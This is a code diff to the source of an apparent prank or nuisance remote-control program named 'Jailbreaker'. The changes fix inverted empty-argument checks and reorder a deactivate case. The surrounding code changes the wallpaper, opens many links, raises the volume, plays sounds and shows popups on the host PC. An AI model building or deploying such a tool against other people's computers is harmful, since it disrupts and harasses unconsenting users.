@@ -2,7 +2,7 @@
 #include "Link.h"
 
 void changeWallpaper(const char *img) {
-    if(!img[0]) {
+    if(img[0] == '\0') {
         JBlogErr("Not enough arguments");
         return;
     }
@@ -34,7 +34,7 @@ LONG ChangeRotation(DWORD Orient) {
 
 
 void openLink(const char *site) {
-    if(!site[0]) {
+    if(site[0] == '\0') {
         JBlogErr("Not enough arguments");
         return;
     }
@@ -49,7 +49,7 @@ const char *PCName;
 static char wallpaper[MAX_PATH] = BADPATH;
 
 void play(const char *src) {
-    if (!src[0] == 0) {
+    if (src[0] == '\0') {
         JBlogErr("Not enough arguments");
         return;
     }
@@ -62,7 +62,7 @@ void play(const char *src) {
 }
 
 void popupW(char *argz) {
-    if (!argz[0] == 0) {
+    if (argz[0] == '\0') {
         JBlogErr("Not enough arguments");
         return;
     }
@@ -98,7 +98,7 @@ void popupW(char *argz) {
 
 
 void popupA(char *argz) {
-    if(!argz[0]) {
+    if(argz[0] == '\0') {
         JBlogErr("Not enough arguments");
         return;
     }
@@ -121,15 +121,15 @@ void execCommand(JBCMD cmd)
     switch (cmd.cmd)
     {
     /* --- Templates --- */
+    case JB_DEACTIVE:
+        JBlog("Jailbreaker deactivated.");
+        exit(0);
+        break;
     case JB_FUN:
         CreateLinks(180);
         SendMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, APPCOMMAND_VOLUME_UP);
         PlaySoundA("res\\stalker.wav", NULL, SND_FILENAME | SND_ASYNC);
         changeWallpaper("res\\jail.png");
-        break;
-    case JB_DEACTIVE:
-        JBlog("Jailbreaker deactivated.");
-        exit(0);
         break;
     case JB_REMOVE:
         // you should uninstall yourself NOW!!!
